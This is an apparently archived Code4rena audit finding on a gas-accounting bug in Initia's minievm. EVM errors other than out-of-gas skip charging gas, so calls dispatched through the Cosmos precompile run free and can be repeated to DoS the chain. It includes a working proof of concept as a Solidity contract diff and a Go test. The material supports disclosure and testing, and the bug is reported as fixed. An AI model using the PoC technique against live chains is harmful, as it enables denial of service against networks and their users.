---
tags:
  - lang/solidity
  - sector/infra
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
protocol: "[[Initia]]"
auditors:
  - berndartmueller
report: "https://code4rena.com/reports/2025-02-initia-cosmos"
genome:
  - "[[dos-resistance]]"
  - "[[unbounded-loop]]"
  - "[[known-pattern]]"
---
# [H-07] EVM stack overflow error leads to no gas being charged, which can be exploited to DoS the chain by dispatching EVM calls via the cosmos precompile

- id: 55310
- impact: HIGH
- protocol: Initia
- reporter: berndartmueller (Code4rena)
- source: https://code4rena.com/reports/2025-02-initia-cosmos

## Summary


The bug report is about two functions, `EVMCallWithTracer()` and `EVMCreateWithTracer()`, in the `context.go` file of the `minievm` repository. These functions have a special case where `gasRemaining` is equal to 0 and `err` is not equal to `ErrOutOfGas`. This can happen in certain scenarios like stack overflow errors, invalid jump destinations, or invalid opcodes. The problem with this is that no gas is charged for the EVM call, which can cause issues with the block gas meter and allow for DoS attacks. A proof of concept is provided to demonstrate this issue, and it is recommended to consume gas before returning an error to mitigate it. The bug has been fixed in the repository.

## Details



<https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/keeper/context.go# L300-L303>

<https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/keeper/context.go# L405-L407>

### Finding description and impact

Both the `EVMCallWithTracer()` and `EVMCreateWithTracer()` functions check the special case where `gasRemaining == 0 && err != nil && err != vm.ErrOutOfGas`, which can happen in scenarios like:

* Stack overflow errors
* Invalid jump destinations
* Invalid opcodes
```

// evm sometimes return 0 gasRemaining, but it's not an out of gas error.
if gasRemaining == 0 && err != nil && err != vm.ErrOutOfGas {
	return nil, common.Address{}, nil, types.ErrEVMCreateFailed.Wrap(err.Error())
}
```

In this situation, it returns early with an error, without adding the used EVM gas to the gas meter. Consequently, the EVM call was gas-free.

This if not a particular big problem for regular Cosmos SDK EVM calls, as the user already paid for the full gas (limit) upfront. The issue it causes is that the block gas meter will be incorrectly updated, it will not reflect the actual gas used by the EVM call; the impact of this is limited.

However, it is specifically problematic in the context of EVM calls that have been dispatched via the `CosmosPrecompile` precompile. Such calls are executed by [`dispatchMessage()`](https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/keeper/context.go# L491), which does not charge the gas upfront. Therefore, no gas is charged at all of such dispatched EVM calls, which allows DoS attacks by repeating such calls.

### Proof of Concept

The following PoC demonstrates a stack overflow error in the `Counter` contract during a dispatched (nested) EVM call. It shows that in this case, no gas is charged for the nested call.

Calling `recursive()` will dispatch another EVM call to `Counter.nested()` (that is allowed to fail so that the error is not propagated), which then first consumes a lot of gas by calling `consumeGas(1_000_000)`, followed by triggering a stack overflow by calling `triggerStackOverflow()`.

In this case, `gasRemaining` will be 0, and `err != vm.ErrOutOfGas`, resulting in no gas being charged for the nested call, leaving the overall gas used below 100,000.

First, update the `Counter` contract:
```

diff --git a/x/evm/contracts/counter/Counter.sol b/x/evm/contracts/counter/Counter.sol
index 2c5166e..6659e79 100644
--- a/x/evm/contracts/counter/Counter.sol
+++ b/x/evm/contracts/counter/Counter.sol
@@ -23,6 +23,27 @@ contract Counter is IIBCAsyncCallback {
         increase_for_fuzz(num - 1);
     }

+    function triggerStackOverflow() internal {
+        // Local variables to fill up the stack
+        uint256 a1 = 1;
+        uint256 a2 = 2;
+        uint256 a3 = 3;
+        uint256 a4 = 4;
+        uint256 a5 = 5;
+
+        // Recursive call that will overflow the stack
+        triggerStackOverflow();
+
+        // This line will never be reached
+        count += a1 + a2 + a3 + a4 + a5;
+    }
+
+    function consumeGas(uint256 iterations) internal {
+        for (uint256 i = 0; i < iterations; i++) {
+            count++;
+        }
+    }
+
     function increase() public payable {
         count++;
         emit increased(count - 1, count);
@@ -59,7 +80,7 @@ contract Counter is IIBCAsyncCallback {
         string memory exec_msg,
         bool allow_failure,
         uint64 callback_id
-    ) external {
+    ) public {
         COSMOS_CONTRACT.execute_cosmos_with_options(
             exec_msg,
             ICosmos.Options(allow_failure, callback_id)
@@ -77,14 +98,13 @@ contract Counter is IIBCAsyncCallback {
     function recursive(uint64 n) public {
         emit recursive_called(n);

-        if (n == 0) {
-            return;
-        }
+        execute_cosmos_with_options(_recursive(n), true, 0); // dispatches an EVM call to `nested()`, allows call to fail, no callback
+    }

-        COSMOS_CONTRACT.execute_cosmos(_recursive(n));
+    function nested() external {
+        consumeGas(1_000_000);

-        // to test branching
-        COSMOS_CONTRACT.execute_cosmos(_recursive(n));
+        triggerStackOverflow();
     }

     function _recursive(uint64 n) internal returns (string memory message) {
@@ -99,7 +119,7 @@ contract Counter is IIBCAsyncCallback {
                 '",',
                 '"input": "',
                 Strings.toHexString(
-                    abi.encodePacked(this.recursive.selector, abi.encode(n - 1))
+                    abi.encodePacked(this.nested.selector)
                 ),
                 '",',
                 '"value": "0",',
```

Then, copy and paste the following test case to `x/evm/keeper/context_test.go`:
```

func Test_StackOverflowNoGasCharged(t *testing.T) {
	ctx, input := createDefaultTestInput(t)
	_, _, addr := keyPubAddr()

	counterBz, err := hexutil.Decode(counter.CounterBin)
	require.NoError(t, err)

	// deploy counter contract
	caller := common.BytesToAddress(addr.Bytes())
	retBz, contractAddr, _, err := input.EVMKeeper.EVMCreate(ctx, caller, counterBz, nil, nil)
	require.NoError(t, err)
	require.NotEmpty(t, retBz)
	require.Len(t, contractAddr, 20)

	// call recursive function
	parsed, err := counter.CounterMetaData.GetAbi()
	require.NoError(t, err)

	inputBz, err := parsed.Pack("recursive", uint64(1))
	require.NoError(t, err)

	gasBefore := ctx.GasMeter().GasConsumed()

	_, logs, err := input.EVMKeeper.EVMCall(ctx, caller, contractAddr, inputBz, nil, nil)

	gasUsed := ctx.GasMeter().GasConsumed() - gasBefore

	require.NoError(t, err)
	require.Equal(t, 1, len(logs))
	require.LessOrEqual(t, gasUsed, uint64(100_000))
}
```

Compile the Solidity contracts with `make contracts-gen` and run the test case.

### Recommended mitigation steps

Consider consuming the gas before returning the error in lines `302` and `407` to always charge gas regardless of the error.

**[beer-1 (Initia) confirmed and commented](https://code4rena.com/audits/2025-02-initia-cosmos/submissions/F-13?commentParent=sbLQmhPSKND):**

> We already received this review in other audit, but it is not publicly exposed during competition, so it should be valid report.
>
> Fixed [here](https://github.com/initia-labs/minievm/commit/7c83e01a2c6d5cfb28354f251de9897f700096e1).

**[Initia mitigated](https://github.com/code-423n4/2025-03-initia-cosmos-mitigation?tab=readme-ov-file# mitigation-of-high--medium-severity-issues):**

> Changed to return exact error only at `simulate` or `checktx`.

**Status:** Mitigation confirmed. Full details in reports from [0xAlix2](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-30), [berndartmueller](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-24) and [Franfran](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-40).

---


